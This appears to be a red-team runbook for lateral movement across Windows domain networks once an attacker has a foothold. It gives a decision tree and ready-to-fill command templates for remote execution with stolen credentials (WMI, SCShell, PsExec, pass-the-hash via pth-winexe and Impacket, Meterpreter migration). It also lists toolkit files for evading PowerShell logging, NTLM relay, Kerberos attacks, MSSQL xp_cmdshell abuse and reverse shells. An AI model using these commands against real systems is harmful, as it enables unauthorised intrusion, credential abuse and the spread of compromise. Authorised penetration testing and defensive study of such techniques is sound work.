# Lateral Movement Runbook

> You have a foothold. Now move to other systems.

---

## Decision Tree

```
Do I have valid credentials (hash or plaintext)?
├── YES → WMI / PSExec / SCShell
│         └── windows/RUNBOOK.md
├── NO  → Is there an MSSQL server I can reach?
│         ├── YES → mssql/RUNBOOK.md (PowerUpSQL enumeration)
│         └── NO  → Is there a web server to drop a webshell?
│                   ├── YES → 03-loaders/webshells/ASPX_Inject64.aspx
│                   └── NO  → Need creds first (06-credentials)
│
├── Fileless (in-memory only, leave no disk artifacts)
│   └── fileless/RUNBOOK.md
│
└── Linux target in scope?
    └── linux/RUNBOOK.md (Ansible, Artifactory, Kerberos on Linux)
```

---

## Quick Commands

### WMI (no PSExec, less noisy)
```cmd
wmic /node:<TARGET> /user:<DOMAIN>\<USER> /password:<PASS> process call create "cmd /c <command>"
```

### SCShell (no PSExec dependency)
```cmd
.\SCShell.exe <TARGET> XblAuthManager "C:\Windows\System32\cmd.exe /c <command>" <DOMAIN>\<USER> <PASS>
```

### PSExec style (needs admin on target)
```cmd
.\PsExec.exe \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd
```

### Pass-the-Hash (no plaintext needed)
```cmd
# pth-winexe
pth-winexe -U <DOMAIN>/<USER>%aad3b435b51404eeaad3b435b51404ee:<NTHASH> //<TARGET> cmd.exe

# Impacket psexec
python3 psexec.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>
```

### Fileless via Meterpreter
```
# From existing meterpreter session
migrate <PID>                    # migrate to stable process first
shell                            # get shell
wmic ... (as above)
```

---

## Files in This Section

| File | Purpose |
|------|---------|
| `windows/PSLessExec.cs` | PS-less execution via C# (avoids PS logging) |
| `windows/SharpHound.ps1` | BloodHound data collection |
| `windows/smb_trigger.cs` | Trigger SMB auth (for NTLM relay) |
| `windows/SCShell.exe` | Service Control lateral movement |
| `windows/Rubeus.dll` | Kerberos attack framework |
| `mssql/sql-v2.cs` | MSSQL C# runner with xp_cmdshell |
| `mssql/PowerUpSQL.ps1` | MSSQL enumeration + exploitation |
| `mssql/linked_server_rev_shell.cs` | Linked server → reverse shell |
| `mssql/LinkedSQLPrivEscRevShell.cs` | Linked server + priv esc → reverse shell |
| `fileless/fileless-lateral.cs` | In-memory lateral movement |
